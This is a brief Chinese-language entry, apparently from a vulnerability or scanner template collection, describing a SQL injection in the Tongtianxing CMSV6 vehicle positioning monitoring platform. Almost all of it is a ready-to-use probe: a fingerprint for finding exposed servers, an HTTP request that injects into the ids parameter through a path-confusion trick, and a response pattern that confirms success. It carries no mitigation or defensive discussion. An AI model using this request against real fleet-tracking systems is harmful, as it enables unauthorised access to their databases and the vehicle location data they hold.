# 通天星CMSV6车载定位监控平台SQL注入

通天星CMSV6车载定位监控平台 ｜ SQL注入 ｜ —
- **指纹**：`body="/808gps/"`
- **请求**：`GET /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1 HTTP/1.1`
- **响应特征**：200 ^(?=.*?result)(?=.*?10001).*?$